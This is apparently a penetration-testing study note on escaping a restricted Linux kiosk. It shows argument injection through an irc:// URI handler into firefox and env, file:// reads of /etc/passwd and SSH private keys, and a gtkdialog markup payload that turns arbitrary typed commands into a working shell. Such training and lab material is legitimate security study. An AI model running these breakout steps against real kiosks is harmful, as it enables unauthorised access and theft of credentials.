---
title: Kiosk Command Execution
draft: false
tags:
---
 
If we are able spawn a prompt to select an application, we are able to bypass the Kiosk security restrictions:
![[Pasted image 20260714171927.png]]

---
# Filesystem enumeration

If we click on "Choose", we can see that we can browse through the filesystem:
![[Pasted image 20260714172052.png]]

We can see that the home directory is "guest" indicating the user running the Kiosk. We can also attempt to right click or middle click on the interface, icons, etc.

> [!Note]
> We could right/middle click to open a file explorer or create shortcuts to applications which we could run.

We can browse through the different folders and applications. We'll search a variety of folders that contain [Linux binaries](https://askubuntu.com/questions/27213/what-is-the-linux-equivalent-to-windows-program-files), including **/bin**, **/usr/bin**, **/usr/share**, **/sbin**, **/usr/sbin**, **/opt** and **/usr/local**.
![[Pasted image 20260714172809.png]]

We should use a common [graphical terminal emulator](https://en.wikipedia.org/wiki/Terminal_emulator) such as xterm, gnome-terminal or konsole, but they are often removed.

We can take note of other programs that might be helpful like: [**/bin/busybox**](https://busybox.net/about.html) which combines common Linux/Unix utilities into a single binary, or [**/usr/bin/dunstify**](https://wiki.archlinux.org/index.php/Dunst#Dunstify), which displays quick pop-up messages that disappear after a short period of time.

If we test the latest one, we can see that it displayed a drop-down notification with the URL we placed:
![[Pasted image 20260714173547.png]]

This is important for 2 things:
1. There is no protection mechanism that blocks external applications.
2. The URI is passed as an argument to the application we select.
```bash
dunstify irc://myhost
```

If we test something like /bin/bash, obviously it will fail:
```
kali@kali:~$ /bin/bash irc://myhost
/bin/bash: irc://myhost: No such file or directory
```

but we can bypass this by using /bin/env to set the first argument as an environment variable:
```bash
/usr/bin/env irc://myhost=something /bin/bash
```

If we test it on kali it works fine. But if we test it on the kiosks firefox y returns an error (probably due to the lack of terminal emulator programs on the system):
![[Pasted image 20260714174252.png]]

As we know, firefox works perfectly fine and also accepts the URL `irc://myhost`. We also know that firefox command line tool spawns with the URL as the first argument:
```
firefox URL
```

# Leveraging Firefox Profiles

Firefox is running in a restricted mode likely set in a specially configured profile. We may be able to break out of these restrictions by loading a different profile configuration.

Lets test it by running the following payload to open firefox with a different profile (select firefox as the running application):
```
irc://myhost -P "haxor"
```

![[Pasted image 20260714174747.png]]

We can see that it launched a new instance of Firefox with the firefox profile manager:
![[Pasted image 20260714174922.png]]

We can then create our own profile:
![[Pasted image 20260714174951.png]]

And we can see we have broken the restricted instance of firefox:
![[Pasted image 20260714175035.png]]

---
# Enumerating the System Information

In case the Kiosk was connected to the internet, we could install extensions such as terminal emulators or file browsers. We could connect to online tools such as text editors, which could help us write local files. In fact, we could even leverage highly specialized kiosk pentesting tools like [_iKAT_](http://www.ikat.kronicd.net/).

In case we are not connected to the internet, we can start by enumerating the local file system like if we where using directory traversal:
```
file:///etc/passwd
```
![[Pasted image 20260714175400.png]]

Enumerate version file:
```
file:///proc/version
```
![[Pasted image 20260714175719.png]]

Enumerate SSH keys:
```
file:///home/<user>/.ssh/
file:///home/<user>/.ssh/id_rsa
file:///home/<user>/.ssh/id_ecdsa
...
```
![[Pasted image 20260714175905.png]]

To open a file explorer, we could leverage the "show downloads" option:
![[Pasted image 20260714180056.png]]

Finally, we could interact with the Web developer tools:
![[Pasted image 20260714180315.png]]

We will start with [_Scratchpad_](https://developer.mozilla.org/en-US/docs/Tools/Scratchpad).

---
# Scratching the Surface - Simulating an Interactive Shell

Scratchpad is a built-in text editor intended for running and debugging JavaScript but can also load and save plain-text files.

We could leverage [**/usr/bin/gtkdialog**](https://code.google.com/archive/p/gtkdialog/), which builds interfaces with an HTML-style markup language (useful in case there is no other build tools such as gcc or g++)

Elements Syntaxis: [GtkDialog](https://code.google.com/archive/p/gtkdialog/wikis)

TODO: Find a way to write user-provided text to a file on the file system without Scratchpad. One potential option might include the JavaScript console.

There is an actual [_terminal_](https://code.google.com/archive/p/gtkdialog/wikis/terminal.wiki) element for gtkdialog, but the necessary libraries might be missing:
```
The terminal (VteTerminal) widget requires a version of gtkdialog built with libvte.
```

1. Write the following code in the editor:
```
<window>
  <vbox>
    <vbox scrollable="true" width="500" height="400">
        <edit>
          <variable>CMDOUTPUT</variable>
          <input file>/tmp/termout.txt</input>
        </edit>
    </vbox>
    <hbox>
      <text><label>Command:</label></text>
      <entry><variable>CMDTORUN</variable></entry>
      <button>
          <label>Run!</label>  
          <action>$CMDTORUN > /tmp/termout.txt</action>
          <action>refresh:CMDOUTPUT</action>  
      </button>
    </hbox>
  </vbox>
</window>
```

2. Save the file at `/home/<user>/terminal.txt` and make sure to put "All Files":
![[Pasted image 20260714184202.png]]

3. Run the payload by specifying the following URI; select gtkdialog as the running application:
```
irc://myhost -f /home/guest/terminal.txt
```

4. We now have RCE:
![[Pasted image 20260714184833.png]]

TODO:
1. Improve the terminal, making it more effective or more reliable. Integrate standard error output.
2. Explore the other widgets and elements of gtkdialog. What other useful features can be created with it that might be useful for interacting with the system?
#### Extra Mile

TODO: Experiment with creating simple applications with gtkdialog to streamline the exploitation process. One potential project is a text editor based on our terminal application.






